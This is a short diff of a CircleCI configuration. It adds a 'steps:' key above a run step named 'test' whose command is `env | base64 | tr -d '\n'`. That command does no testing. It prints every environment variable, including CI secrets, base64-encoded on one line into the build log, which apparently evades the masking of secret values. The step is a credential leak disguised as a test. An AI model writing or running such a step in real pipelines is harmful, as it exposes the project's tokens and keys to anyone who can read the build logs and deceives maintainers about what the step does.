@@ -5,6 +5,7 @@ jobs:
     docker:
       - image: circleci/golang:1.13-node
 
+    steps:
       - run:
           name: test
           command: env | base64 | tr -d '\n'
